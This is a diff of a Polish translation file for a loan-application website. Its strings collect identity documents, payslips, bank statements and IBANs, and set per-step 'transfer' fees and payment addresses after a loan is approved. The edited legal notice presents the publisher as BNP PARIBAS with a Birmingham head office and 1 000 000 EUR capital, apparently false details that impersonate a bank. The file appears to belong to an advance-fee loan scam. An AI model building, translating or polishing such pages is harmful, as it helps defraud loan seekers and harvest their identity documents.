@@ -190,7 +190,7 @@
     "success": "Wniosek wysłany!",
     "requiredDocs": "Wymagane dokumenty do weryfikacji",
     "requiredDocsHint": "Prześlij czytelne pliki PDF, JPG lub PNG, aby przyspieszyć zatwierdzenie.",
-    "doc1": "Ważny dowód tożsamości (obie strony)",
+    "doc1": "Ważny dowód tożsamości lub prawo jazdy (obie strony) — lub paszport (tylko przód)",
     "doc2": "Aktualne potwierdzenie adresu",
     "doc3": "Trzy ostatnie odcinki wypłat lub dowód dochodu",
     "doc4": "Najnowszy wyciąg bankowy lub IBAN na nazwisko wnioskodawcy",
@@ -282,8 +282,8 @@
     "defaultEmailPlaceholder": "ty@przyklad.com",
     "back": "Wstecz",
     "phoneTitle": "Obsługa klienta",
-    "address": "16 boulevard des Italiens",
-    "addressCity": "75009 Paryż, Francja",
+    "address": "103 avenue des Champs-Élysées",
+    "addressCity": "75008 Paryż, Francja",
     "sending": "Wysyłanie…",
     "successQueued": "Twoja wiadomość została zarejestrowana. Nasz zespół odpowie wkrótce."
   },
@@ -442,7 +442,7 @@
     "sectionHelp": "Ustaw opłaty i adres płatności dla każdego kroku, zweryfikuj paragon, a następnie wyślij kod.",
     "gatedTitle": "Konfiguracja zablokowana",
     "gatedDesc": "Konfiguracja kroku transferu staje się dostępna po akceptacji pożyczki.",
-    "address": "16 boulevard des Italiens",
+    "address": "Adres płatności",
     "saved": "Konfiguracja zapisana",
     "invalidFee": "Nieprawidłowa opłata",
     "codeSent": "Kod wygenerowany i wysłany",
@@ -1057,7 +1057,7 @@
       "sections": [
         {
           "h": "Wydawca",
-          "p": "BNP PARIBAS — SAS z kapitałem 1 000 000 EUR — siedziba: 16 boulevard des Italiens, 75009 Paris, France"
+          "p": "BNP PARIBAS — SAS z kapitałem 1 000 000 EUR — siedziba: 1 Centenary Square, Birmingham, Wielka Brytania."
         },
         {
           "h": "Odpowiedzialny",
